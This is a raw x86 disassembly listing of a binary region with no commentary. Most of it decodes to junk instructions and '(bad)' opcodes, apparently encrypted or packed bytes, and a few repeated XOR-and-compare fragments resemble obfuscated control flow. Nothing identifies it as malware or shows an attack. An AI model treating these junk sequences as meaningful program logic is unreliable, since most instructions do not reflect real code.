  40b608:	pop    ebp
  40b609:	or     eax,0x29d60ec
  40b60e:	lea    ebx,[edx+0x53ceb3e5]
  40b614:	cdq    
  40b615:	dec    ebx
  40b616:	push   esi
  40b617:	dec    eax
  40b618:	push   0xb
  40b61a:	out    0xf6,al
  40b61c:	dec    edx
  40b61d:	cmp    DWORD PTR [eax+0x119e13ca],edx
  40b623:	add    BYTE PTR [edx-0x41f44954],bh
  40b629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b62a:	stos   BYTE PTR es:[edi],al
  40b62b:	and    eax,0x7790565a
  40b630:	push   eax
  40b631:	and    al,0x68
  40b633:	sub    ecx,edi
  40b635:	(bad)  
  40b636:	out    dx,eax
  40b637:	mul    DWORD PTR [ebp-0x6c92565e]
  40b63d:	imul   esi,DWORD PTR [ebx+0x723d3d6b],0xffffffa4
  40b644:	pop    esi
  40b645:	inc    esi
  40b646:	es inc ebx
  40b648:	inc    ebx
  40b649:	jb     0x40b6c1
  40b64b:	(bad)  
  40b64c:	push   esi
  40b64d:	aas    
  40b64e:	lahf   
  40b64f:	repnz pop esi
  40b651:	ror    BYTE PTR [edx+0x2b4b7b75],cl
  40b657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b658:	xchg   ebx,eax
  40b659:	out    0xc,eax
  40b65b:	push   ds
  40b65c:	outs   dx,BYTE PTR ds:[esi]
  40b65d:	lds    ebx,FWORD PTR ds:0xfb8d9316
  40b663:	mov    al,0x14
  40b665:	add    eax,0xd1a07dcb
  40b66a:	mov    WORD PTR [edx+0x4ede25c9],ss
  40b670:	mov    bh,0x20
  40b672:	arpl   WORD PTR [edi],bp
  40b674:	cmp    dh,BYTE PTR [edx+0x34ee2409]
  40b67a:	push   ebx
  40b67b:	jno    0x40b685
  40b67d:	cwde   
  40b67e:	es dec ecx
  40b680:	int    0xd6
  40b682:	(bad)  
  40b684:	test   BYTE PTR [esp+ebx*8+0x63a036d3],bh
  40b68b:	imul   edx,DWORD PTR [eax+0x4],0x90988e64
  40b692:	(bad)  
  40b693:	sbb    eax,0xe22f11e6
  40b698:	repz test eax,0x533f6277
  40b69e:	dec    eax
  40b69f:	push   edx
  40b6a0:	add    bh,BYTE PTR [ecx-0x6ef9832a]
  40b6a6:	xor    al,0xe9
  40b6a8:	pop    eax
  40b6a9:	in     al,0x22
  40b6ab:	fwait
  40b6ac:	sbb    eax,DWORD PTR [ebx]
  40b6ae:	int3   
  40b6af:	adc    BYTE PTR [esi],bh
  40b6b1:	and    BYTE PTR [edx-0x74],dh
  40b6b4:	test   BYTE PTR [edi],dl
  40b6b6:	xor    al,0x44
  40b6b8:	imul   edx,esp,0xffffffaa
  40b6bb:	ins    BYTE PTR es:[edi],dx
  40b6bc:	les    eax,FWORD PTR [ebp+0x19]
  40b6bf:	ds pop esi
  40b6c1:	in     eax,dx
  40b6c2:	aas    
  40b6c3:	mov    esp,?
  40b6c5:	imul   eax,DWORD PTR [esi+0x4fe65328],0x65
  40b6cc:	pop    esp
  40b6cd:	pop    esi
  40b6ce:	ret    
  40b6cf:	adc    ebx,DWORD PTR [ebp+eax*8+0x51]
  40b6d3:	aad    0xd
  40b6d5:	aam    0x61
  40b6d7:	(bad)  
  40b6d8:	push   ss
  40b6d9:	sub    dh,BYTE PTR [ebp-0x52]
  40b6dc:	add    ah,BYTE PTR [edi-0x1d]
  40b6df:	xor    esi,DWORD PTR [edx-0x5a]
  40b6e2:	cmp    dh,dh
  40b6e4:	xor    eax,0x35d9d633
  40b6e9:	(bad)  
  40b6ea:	mov    ds:0xf4694a2,eax
  40b6ef:	xor    ah,BYTE PTR [edi+0x11]
  40b6f2:	sub    DWORD PTR [ecx+0x1e6da7bd],ebp
  40b6f8:	cmc    
  40b6f9:	ss aaa 
  40b6fb:	mov    DWORD PTR [edi+0x46],ebx
  40b6fe:	xor    eax,0xaedd96f1
  40b703:	mov    WORD PTR [ebp+eax*2-0x51],ds
  40b707:	into   
  40b708:	cmc    
  40b709:	lahf   
  40b70a:	or     eax,0xcd85b0e5
  40b70f:	stc    
  40b710:	and    eax,0x4e42fd1
  40b715:	(bad)  
  40b716:	xlat   BYTE PTR ds:[ebx]
  40b717:	es call 0xb25c385e
  40b71d:	mov    esi,0xbfefe890
  40b722:	inc    ecx
  40b723:	or     edi,ecx
  40b725:	lods   eax,DWORD PTR ds:[esi]
  40b726:	rcl    BYTE PTR [ebp-0x181483a1],cl
  40b72c:	cmp    eax,0x3252426a
  40b731:	scas   al,BYTE PTR es:[edi]
  40b732:	imul   BYTE PTR [edi]
  40b734:	(bad)  
  40b735:	loop   0x40b77f
  40b737:	push   ebx
  40b738:	leave  
  40b739:	std    
  40b73a:	bnd jg 0x40b787
  40b73d:	sahf   
  40b73e:	popa   
  40b73f:	sbb    ecx,DWORD PTR [ebx]
  40b741:	mov    eax,ds:0x7f7a0022
  40b746:	jmp    0x40b719
  40b748:	xchg   esi,eax
  40b749:	imul   esi,DWORD PTR [edx],0xce7637bc
  40b74f:	icebp  
  40b750:	popf   
  40b751:	jp     0x40b774
  40b753:	sti    
  40b754:	jne    0x40b6e3
  40b756:	(bad)  
  40b757:	imul   ebx,DWORD PTR [edi-0x1],0x75ffd075
  40b75e:	or     al,0xe8
  40b760:	scas   al,BYTE PTR es:[edi]
  40b761:	dec    edx
  40b762:	add    BYTE PTR [eax],al
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	je     0x40b7e9
  40b78c:	ds mov esi,0x7e7efeb2
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	je     0x1cab3afa
  40b79c:	mov    eax,0xcdffcbb0
  40b7a1:	ret    0x9a7
  40b7a4:	jmp    0xf925:0x123736cb
  40b7ab:	or     ecx,DWORD PTR [ecx]
  40b7ad:	nop
  40b7ae:	repz jno 0x40b822
  40b7b1:	or     ebx,ebx
  40b7b3:	cdq    
  40b7b4:	sub    bl,BYTE PTR [ebp-0x33]
  40b7b7:	clc    
  40b7b8:	(bad)  [ecx-0x5add0360]
  40b7be:	push   edi
  40b7bf:	ss dec esp
  40b7c1:	mov    BYTE PTR [eax-0x4],dh
  40b7c4:	jg     0x40b82c
  40b7c6:	xchg   DWORD PTR [eax+0x77],esp
  40b7c9:	push   es
  40b7ca:	mov    ecx,0x1587d7be
  40b7cf:	add    dh,BYTE PTR [ecx]
  40b7d1:	cmp    BYTE PTR [esp+ecx*1+0x63704318],0x58
  40b7d9:	or     DWORD PTR [eax+0x26760d60],eax
  40b7df:	sahf   
  40b7e0:	mov    edx,0x119067f2
  40b7e5:	xchg   ecx,eax
  40b7e6:	dec    esi
  40b7e7:	popf   
  40b7e8:	mov    ch,BYTE PTR [eax]
  40b7ea:	(bad)  
  40b7eb:	fbld   TBYTE PTR [eax+edi*1]
  40b7ee:	or     eax,0xa3325868
  40b7f3:	jb     0x40b777
  40b7f5:	scas   eax,DWORD PTR es:[edi]
  40b7f6:	das    
  40b7f7:	cmp    edx,DWORD PTR [esi-0x7d]
  40b7fa:	xchg   ebp,eax
  40b7fb:	mov    ds:0xaf217f57,eax
  40b800:	popf   
  40b801:	(bad)  
  40b802:	adc    ebx,esi
  40b804:	es aam 0x8c
  40b807:	or     eax,0x2e4293c2
  40b80c:	pusha  
  40b80d:	rol    DWORD PTR [edi],0xe9
  40b810:	sub    BYTE PTR [esi-0x5c513e36],0xd3
  40b817:	iret   
  40b818:	stos   DWORD PTR es:[edi],eax
  40b819:	loope  0x40b7f5
  40b81b:	or     DWORD PTR [ebp-0x1d14eb28],esi
  40b821:	xor    BYTE PTR [eax-0x9d4eae9],bh
  40b827:	and    ecx,ecx
  40b829:	into   
  40b82a:	push   edi
  40b82b:	int3   
  40b82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b82d:	dec    eax
  40b82e:	popa   
  40b82f:	or     edx,ecx
  40b831:	and    DWORD PTR [esi-0xc3ed537],ecx
  40b837:	shl    DWORD PTR [ebx-0x10d395fa],cl
  40b83d:	inc    ecx
  40b83e:	(bad)  
  40b83f:	sub    eax,0x1874459
  40b844:	cmp    edx,esi
  40b846:	inc    ecx
  40b847:	and    DWORD PTR [ecx],edi
  40b849:	das    
  40b84a:	stos   DWORD PTR es:[edi],eax
  40b84b:	hlt    
  40b84c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b84d:	pop    ss
  40b84e:	sbb    al,0x74
  40b850:	aas    
  40b851:	xor    eax,0x252d7f5a
  40b856:	dec    esp
  40b857:	cli    
  40b858:	cld    
  40b859:	cmp    bh,bl
  40b85b:	sub    eax,0xa479f4f
  40b860:	iret   
  40b861:	cmp    esp,DWORD PTR [esp+0x1ebeface]
  40b868:	push   esp
  40b869:	hlt    
  40b86a:	scas   eax,DWORD PTR es:[edi]
  40b86b:	(bad)  
  40b86c:	in     al,dx
  40b86d:	dec    ebp
  40b86e:	fcmovu st,st(2)
  40b870:	sbb    DWORD PTR [eax*8+0x1002f0a1],edi
  40b877:	sbb    eax,0x226b3d8c
  40b87c:	jecxz  0x40b80a
  40b87e:	jg     0x40b89b
  40b880:	jl     0x40b87f
  40b882:	in     eax,dx
  40b883:	sub    DWORD PTR [ebx-0x299d9b87],eax
  40b889:	lock cwde 
  40b88b:	in     eax,0x22
  40b88d:	mov    eax,ds:0xbdd1726a
  40b892:	dec    edx
  40b893:	ret    0xdd06
  40b896:	les    eax,FWORD PTR [eax]
  40b898:	mov    ah,0x23
  40b89a:	pop    esi
  40b89b:	shl    BYTE PTR [edi+0x66],0xbe
  40b89f:	lahf   
  40b8a0:	ret    
  40b8a1:	cmp    DWORD PTR [ebp-0x1b],ebp
  40b8a4:	cli    
  40b8a5:	xor    eax,0x8fbda4a5
  40b8aa:	xchg   BYTE PTR [edx-0x20],ch
  40b8ad:	lods   al,BYTE PTR ds:[esi]
  40b8ae:	cmc    
  40b8af:	push   esp
  40b8b0:	adc    BYTE PTR [edi],al
  40b8b2:	inc    edx
  40b8b3:	adc    cl,BYTE PTR [esi]
  40b8b5:	(bad)  
  40b8b6:	lea    esi,[ebx]
  40b8b8:	adc    ah,BYTE PTR [ecx]
  40b8ba:	daa    
  40b8bb:	and    eax,DWORD PTR [edx]
  40b8bd:	and    DWORD PTR [edi-0x4af81800],esp
  40b8c3:	sbb    al,0x57
  40b8c5:	out    dx,al
  40b8c6:	and    DWORD PTR [edx+0xc2ab2c3],esi
  40b8cc:	out    dx,eax
  40b8cd:	out    dx,eax
  40b8ce:	fiadd  DWORD PTR [edi+ebx*1+0x5d]
  40b8d2:	ds jl  0x40b8b0
  40b8d5:	inc    esp
  40b8d6:	imul   esp,esp,0x7e4f27eb
  40b8dc:	add    BYTE PTR [esi-0x43f48b09],0xc4
  40b8e3:	mov    ah,0x8d
  40b8e5:	jmp    0x40b8ba
  40b8e7:	cmp    BYTE PTR [edx-0x6279883a],cl
  40b8ed:	jno    0x40b96d
  40b8ef:	jae    0x40b96c
  40b8f1:	jno    0x40b8c6
  40b8f3:	sub    eax,0xa79e52eb
  40b8f8:	jnp    0x40b8ae
  40b8fa:	cmp    DWORD PTR [edi+0x3f],ecx
  40b8fd:	xchg   ebp,eax
  40b8fe:	inc    ebx
  40b8ff:	fidivr DWORD PTR [ecx+0x25d5ddbd]
  40b905:	sub    al,dl
  40b907:	mov    ecx,0xff26239
  40b90c:	faddp  st(2),st
  40b90e:	mov    eax,0x20d83b6e
  40b913:	push   edi
  40b914:	cmp    esp,DWORD PTR [ecx]
  40b916:	shl    BYTE PTR [ebx+0x1577dc25],0x9d
  40b91d:	mov    DWORD PTR [ecx+0x6beb450f],ebx
  40b923:	mov    ds:0xed48a2af,eax
  40b928:	mov    dh,dl
  40b92a:	cli    
  40b92b:	sbb    dh,bh
  40b92d:	push   cs
  40b92e:	pop    edx
  40b92f:	jns    0x40b904
  40b931:	mov    BYTE PTR [edi+0x18],ch
  40b934:	mov    al,0xb7
  40b936:	mov    ds:0x9a057245,eax
  40b93b:	xchg   BYTE PTR [esi+ecx*1],al
  40b93e:	cmp    al,0xda
  40b940:	sbb    edi,ebx
  40b942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b943:	sub    ah,ch
  40b945:	pop    esi
  40b946:	ins    BYTE PTR es:[edi],dx
  40b947:	xchg   ecx,eax
  40b948:	xchg   edx,eax
  40b949:	add    ecx,DWORD PTR [edi+0x7d]
  40b94c:	and    bl,BYTE PTR [ecx]
  40b94e:	lods   eax,DWORD PTR ds:[esi]
  40b94f:	pop    ebx
  40b950:	pop    ebp
  40b951:	add    edx,0x9dd78fb2
  40b957:	outs   dx,DWORD PTR ss:[esi]
  40b959:	vpminub ymm0,ymm2,ymm1
  40b95d:	cmp    al,0x7e
  40b95f:	sub    BYTE PTR [eax],cl
  40b961:	xor    BYTE PTR [edx],dh
  40b963:	sub    DWORD PTR [esi*2+0x3cf3f2d0],edi
  40b96a:	xchg   DWORD PTR [edx],ebp
  40b96c:	aas    
  40b96d:	cdq    
  40b96e:	and    DWORD PTR [ebp+0x57],edx
  40b971:	lods   al,BYTE PTR ds:[esi]
  40b972:	jl     0x40b90e
  40b974:	mov    edi,0xb8eb242d
  40b979:	icebp  
  40b97a:	or     BYTE PTR [esi+0x3b4900a9],ch
  40b980:	jo     0x40b98f
  40b982:	sbb    DWORD PTR [edi-0x41],ebx
  40b985:	push   0x8f465043
  40b98a:	push   ss
  40b98b:	cmp    BYTE PTR [ecx],0x43
  40b98e:	cmp    BYTE PTR [edx+0x7565af85],al
  40b994:	cmp    ebx,DWORD PTR [eax-0x381b2d92]
  40b99a:	popf   
  40b99b:	xor    edi,DWORD PTR [ebx+0x55]
  40b99e:	xor    eax,0x1ccc1955
  40b9a3:	sub    cl,BYTE PTR [eax]
  40b9a5:	aaa    
  40b9a6:	sub    eax,0x4757fad3
  40b9ab:	(bad)  
  40b9ac:	arpl   WORD PTR cs:[edx],si
  40b9af:	jns    0x40b9ad
  40b9b1:	inc    ecx
  40b9b2:	jge    0x40b97c
  40b9b4:	xchg   ebx,eax
  40b9b5:	clc    
  40b9b6:	push   es
  40b9b7:	cmp    edi,esi
  40b9b9:	push   esp
  40b9ba:	cs jl  0x40b983
  40b9bd:	repz sub al,0x80
  40b9c0:	(bad)  
  40b9c1:	in     al,0x95
  40b9c3:	jle    0x40b9cd
  40b9c5:	cmp    DWORD PTR [esp+ebx*4-0x33],esp
  40b9c9:	fld    TBYTE PTR [ebx+0x6d]
  40b9cc:	cmc    
  40b9cd:	mov    ah,0xd0
  40b9cf:	loop   0x40b96e
  40b9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d2:	push   ebx
  40b9d3:	sub    DWORD PTR [esi],eax
  40b9d5:	sbb    DWORD PTR [ebp+0x16],edi
  40b9d8:	push   esi
  40b9d9:	jmp    0x47e0:0x458b32ce
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x59b4a808],eax
  40ba0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba10:	inc    edi
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	js     0x40ba6e
  40ba1b:	sbb    BYTE PTR [ebx],0x82
  40ba1e:	xchg   edi,eax
  40ba1f:	icebp  
  40ba20:	call   0xa90:0xf9ad888a
  40ba27:	outs   dx,DWORD PTR ds:[esi]
  40ba28:	scas   eax,DWORD PTR es:[edi]
  40ba29:	daa    
  40ba2a:	mov    bl,0xf2
  40ba2c:	jge    0x40ba5d
  40ba2e:	sqrtps xmm4,XMMWORD PTR [edx-0x2e]
  40ba32:	mov    dl,0xfe
  40ba34:	sub    cl,dh
  40ba36:	in     al,0x2d
  40ba38:	das    
  40ba39:	in     eax,0xa0
  40ba3b:	pop    edx
  40ba3c:	fdiv   DWORD PTR [edi]
  40ba3e:	sub    ch,BYTE PTR [ebp+eiz*8+0x38]
  40ba42:	sbb    dl,BYTE PTR [ebx+ecx*1-0x35d19d29]
  40ba49:	lea    eax,[esi+ecx*2+0x4d852db1]
  40ba50:	mov    al,fs:0x4b24e330
  40ba56:	ds imul ecx
  40ba59:	loop   0x40ba07
  40ba5b:	inc    ebx
  40ba5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba5d:	fcom   DWORD PTR [eax+edx*4+0x72915853]
  40ba64:	test   DWORD PTR ds:0xfb76f7be,eax
  40ba6a:	xor    DWORD PTR [ecx-0x2b],edi
  40ba6d:	mov    es,WORD PTR [edi]
  40ba6f:	lea    eax,[edx]
  40ba71:	jg     0x40bada
  40ba73:	jle    0x40bacd
  40ba75:	(bad)  
  40ba76:	push   0x6a
  40ba78:	xor    eax,0xabb40b14
  40ba7d:	push   es
  40ba7e:	push   esp
  40ba7f:	int    0xab
  40ba81:	mov    al,al
  40ba83:	fdivr  st(7),st
  40ba85:	mov    esp,0x1768205b
  40ba8a:	fdivr  st(7),st
  40ba8c:	addr16 mov al,0x79
  40ba8f:	mov    al,BYTE PTR [eax+edx*8-0x79]
  40ba93:	sbb    al,0x3a
  40ba95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba96:	cwde   
  40ba97:	add    al,0xfc
  40ba99:	mov    eax,ds:0xb4f55e7e
  40ba9e:	sub    al,0x9a
  40baa0:	sub    edi,0x8c9510b
  40baa6:	pop    ebp
  40baa7:	jnp    0x40bac3
  40baa9:	test   al,0x8b
  40baab:	es in  al,0x6b
  40baae:	imul   ecx,DWORD PTR ds:0x248fed3d,0x27
  40bab5:	lds    ebp,FWORD PTR [eax+0x69]
  40bab8:	sbb    bl,ah
  40baba:	mov    ecx,0x41c8de97
  40babf:	pop    es
  40bac0:	jmp    0xb744:0x972e0eb5
  40bac7:	push   DWORD PTR [edi+esi*4-0x72]
  40bacb:	adc    esp,DWORD PTR [eax]
  40bacd:	xlat   BYTE PTR ds:[ebx]
  40bace:	inc    ebx
  40bacf:	push   cs
  40bad0:	daa    
  40bad1:	sahf   
  40bad2:	enter  0x62a,0x3d
  40bad6:	cmp    dl,BYTE PTR [eax+eiz*4]
  40bad9:	and    al,0xbf
  40badb:	aaa    
  40badc:	or     BYTE PTR [ecx-0x24800cc2],dh
  40bae2:	pop    edx
  40bae3:	inc    edx
  40bae4:	int3   
  40bae5:	outs   dx,DWORD PTR ds:[esi]
  40bae6:	mov    bl,0x44
  40bae8:	out    0x2b,al
  40baea:	xor    esi,DWORD PTR [ecx+0x29]
  40baed:	push   esi
  40baee:	mul    bh
  40baf0:	lods   al,BYTE PTR ds:[esi]
  40baf1:	popf   
  40baf2:	inc    eax
  40baf3:	sti    
  40baf4:	das    
  40baf5:	fnstcw WORD PTR [edi+0x1d]
  40baf8:	(bad)  [edi]
  40bafa:	adc    al,0xf5
  40bafc:	or     eax,0x35daacfb
  40bb01:	popf   
  40bb02:	xor    BYTE PTR [esi-0x401ff9ae],bh
  40bb08:	stos   BYTE PTR es:[edi],al
  40bb09:	cmc    
  40bb0a:	adc    DWORD PTR [eax-0x53bf7346],ecx
  40bb10:	cmp    eax,0x80787e1b
  40bb15:	adc    ah,dl
  40bb17:	outs   dx,DWORD PTR ds:[esi]
  40bb18:	js     0x40bb5d
  40bb1a:	popf   
  40bb1b:	mov    esi,0x6bc9b29b
  40bb20:	idiv   BYTE PTR [ecx+0x2a]
  40bb23:	and    al,BYTE PTR [ecx-0x3c]
  40bb26:	sub    eax,0xd43e84d4
  40bb2b:	cdq    
  40bb2c:	and    DWORD PTR [eax-0x5aa3f76],esi
  40bb32:	sbb    BYTE PTR [ebp+0x3b],dl
  40bb35:	xchg   DWORD PTR [ecx+0x6d],esp
  40bb38:	sub    dl,BYTE PTR [ebx-0x6a065729]
  40bb3e:	xor    ch,0x35
  40bb41:	push   ebx
  40bb42:	retf   
  40bb43:	ins    DWORD PTR es:[edi],dx
  40bb44:	stos   DWORD PTR es:[edi],eax
  40bb45:	(bad)  
  40bb46:	xor    DWORD PTR [ebx+0x51],ecx
  40bb49:	xor    BYTE PTR [esi+0x7dc3efe6],al
  40bb4f:	jmp    0xdd76:0xd470d0ae
  40bb56:	into   
  40bb57:	in     eax,dx
  40bb58:	inc    eax
  40bb59:	inc    ebp
  40bb5a:	jle    0x40bb43
  40bb5c:	ds mov eax,0xa1f05e27
  40bb62:	mov    WORD PTR [ebx-0x41],?
  40bb65:	pushf  
  40bb66:	psubusw mm4,QWORD PTR [ebx]
  40bb69:	push   esi
  40bb6a:	call   0xd85a:0x5f8482dd
  40bb71:	loopne 0x40bbe8
  40bb73:	mov    BYTE PTR [edi-0x3d01a7b6],ch
  40bb79:	imul   BYTE PTR [esi-0x73c0384f]
  40bb7f:	sbb    edx,DWORD PTR [eax+0x195cc14a]
  40bb85:	jo     0x40bb54
  40bb87:	jl     0x40bb68
  40bb89:	sbb    al,0x77
  40bb8b:	adc    BYTE PTR [esi],bh
  40bb8d:	jae    0x40bbff
  40bb8f:	pop    edx
  40bb90:	stc    
  40bb91:	aas    
  40bb92:	push   cs
  40bb93:	sbb    bh,bl
  40bb95:	(bad)  
  40bb97:	or     al,0xae
  40bb99:	pop    esp
  40bb9a:	imul   ecx,DWORD PTR [ebp-0x5d4e9e6],0x3d
  40bba1:	out    0x5d,eax
  40bba3:	ins    BYTE PTR es:[edi],dx
  40bba4:	(bad)  
  40bba5:	ror    BYTE PTR [edx+edx*2+0x4a94a9e1],1
  40bbac:	or     BYTE PTR [eax],bl
  40bbae:	ret    
  40bbaf:	pop    esi
  40bbb0:	sbb    bl,BYTE PTR [ecx+0x72]
  40bbb3:	sub    DWORD PTR [eax+0x3b],esp
  40bbb6:	(bad)  
  40bbb7:	sub    ch,BYTE PTR [ecx+0x64]
  40bbba:	iret   
  40bbbb:	mov    edi,0x80e97444
  40bbc0:	lahf   
  40bbc1:	mov    eax,ds:0xa264c7e4
  40bbc6:	mov    ds:0xdbc7a32a,al
  40bbcb:	xor    al,0xc3
  40bbcd:	mov    bl,0xe6
  40bbcf:	jp     0x40bb7b
  40bbd1:	js     0x40bbf1
  40bbd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbd4:	test   DWORD PTR [edi],eax
  40bbd6:	and    esi,DWORD PTR [edx-0x57ab9ed1]
  40bbdc:	add    DWORD PTR [edi-0x4b],eax
  40bbdf:	sub    eax,DWORD PTR [ebx-0x80]
  40bbe2:	ins    BYTE PTR es:[edi],dx
  40bbe3:	bound  ebx,QWORD PTR [edx-0x58157545]
  40bbe9:	adc    BYTE PTR [ecx+0x7f],dl
  40bbec:	mov    bh,0x36
  40bbee:	scas   eax,DWORD PTR es:[edi]
  40bbef:	xor    BYTE PTR [ebx],0xaf
  40bbf2:	and    eax,edi
  40bbf4:	mov    ebx,0xdeee1303
  40bbf9:	ds int 0x48
  40bbfc:	sbb    eax,0x28ee07f8
  40bc01:	xchg   BYTE PTR [esi],dh
  40bc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc04:	jb     0x40bc6a
  40bc06:	std    
  40bc07:	pop    eax
  40bc08:	call   0x5b72e309
  40bc0d:	test   DWORD PTR [ebp+0x66],0x23436e50
  40bc14:	sbb    BYTE PTR [edx],bh
  40bc16:	gs adc eax,0xccde09a9
  40bc1c:	sub    al,0xe0
  40bc1e:	sub    DWORD PTR [ebx-0x3b5452a7],edi
  40bc24:	nop
  40bc25:	pop    edx
  40bc26:	push   ebp
  40bc27:	fstp   TBYTE PTR [edi-0x67001e0d]
  40bc2d:	pop    eax
  40bc2e:	sbb    DWORD PTR [ebx-0x14],ebx
  40bc31:	retf   
  40bc32:	popa   
  40bc33:	jg     0x40bc1a
  40bc35:	dec    edx
  40bc36:	rcl    DWORD PTR [edi-0x79e499c6],1
  40bc3c:	rcl    DWORD PTR [ecx-0x5b],0x96
  40bc40:	xlat   BYTE PTR ds:[ebx]
  40bc41:	inc    ebp
  40bc42:	xchg   ebp,eax
  40bc43:	(bad)  
  40bc44:	(bad)  
  40bc45:	call   0x749f:0x732901e7
  40bc4c:	fstp   DWORD PTR [edx+0x68beba8c]
  40bc52:	pop    ecx
  40bc53:	out    0x1d,eax
  40bc55:	inc    edx
  40bc56:	(bad)  [edx-0x2e]
  40bc59:	cmp    DWORD PTR [esi+0x563e0400],eax
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	sub    ecx,edx
  40bc97:	mov    dh,0xd3
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	xchg   esp,eax
  40bca2:	push   edx
  40bca3:	loopne 0x40bcb3
  40bca5:	inc    esp
  40bca6:	push   edx
  40bca7:	pop    ss
  40bca8:	mov    DWORD PTR [ebx+esi*8+0x39],ecx
  40bcac:	cmp    BYTE PTR [ebp+0x51],dh
  40bcaf:	scas   al,BYTE PTR es:[edi]
  40bcb0:	inc    esi
  40bcb1:	out    0x91,eax
  40bcb3:	sar    BYTE PTR [ebp-0x32894a95],cl
  40bcb9:	(bad)
  40bcbc:	or     dl,BYTE PTR [ebp+0x3a9c4b28]
  40bcc2:	sub    al,BYTE PTR [eax]
  40bcc4:	retf   
  40bcc5:	adc    al,0xd0
  40bcc7:	mov    ecx,0xab983c41
  40bccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bccd:	mov    al,0x88
  40bccf:	outs   dx,DWORD PTR ds:[esi]
  40bcd0:	mov    ds:0x4b8d788a,al
  40bcd5:	cli    
  40bcd6:	sbb    esp,DWORD PTR [ecx-0x3c4943e2]
  40bcdc:	aam    0x8f
  40bcde:	pop    ss
  40bcdf:	push   esi
  40bce0:	repnz fwait
  40bce2:	aad    0x27
  40bce4:	fwait
  40bce5:	pusha  
  40bce6:	mov    cl,0x17
  40bce8:	in     eax,0x19
  40bcea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bceb:	pop    es
  40bcec:	out    dx,eax
  40bced:	jge    0x40bcd8
  40bcef:	push   ds
  40bcf0:	int    0xb1
  40bcf2:	fistp  WORD PTR [ebx-0x34]
  40bcf5:	push   ebx
  40bcf6:	push   cs
  40bcf7:	scas   al,BYTE PTR es:[edi]
  40bcf8:	add    BYTE PTR [ebx+ebp*1+0x4db5d3bd],0x96
  40bd00:	mov    esp,0x7ddee086
  40bd05:	js     0x40bcd1
  40bd07:	push   edx
  40bd08:	adc    esp,ebp
  40bd0a:	add    BYTE PTR [ecx-0xa],ah
  40bd0d:	pusha  
  40bd0e:	sub    eax,DWORD PTR [eax-0x56bbd2d]
  40bd14:	icebp  
  40bd15:	adc    ah,al
  40bd17:	mov    ah,0xf0
  40bd19:	inc    ecx
  40bd1a:	pop    edi
  40bd1b:	xor    al,0x52
  40bd1d:	and    edi,DWORD PTR [eax-0x69]
  40bd20:	and    eax,0xd7c58689
  40bd25:	xor    ch,BYTE PTR [esi-0x5d]
  40bd28:	xchg   ebx,eax
  40bd29:	and    esp,DWORD PTR [edi+0x480a13aa]
  40bd2f:	cdq    
  40bd30:	les    edi,FWORD PTR [eax]
  40bd32:	daa    
  40bd33:	scas   al,BYTE PTR es:[edi]
  40bd34:	mov    dl,0x39
  40bd36:	(bad)  
  40bd37:	cmp    eax,0xcbb9ce94
  40bd3c:	jnp    0x40bcc8
  40bd3e:	pop    ecx
  40bd3f:	leave  
  40bd40:	test   BYTE PTR [eax],dl
  40bd42:	adc    edx,ebp
  40bd44:	and    eax,0xf1b88dc6
  40bd49:	cmp    dh,ch
  40bd4b:	pop    eax
  40bd4c:	shr    BYTE PTR [eax+0x61f0a899],cl
  40bd52:	inc    ebp
  40bd53:	lods   eax,DWORD PTR ds:[esi]
  40bd54:	cmp    ch,BYTE PTR [edi]
  40bd56:	lds    eax,FWORD PTR [esi]
  40bd58:	jg     0x40bdcf
  40bd5a:	and    DWORD PTR [eax+edi*2+0x5f],ebx
  40bd5e:	pop    ecx
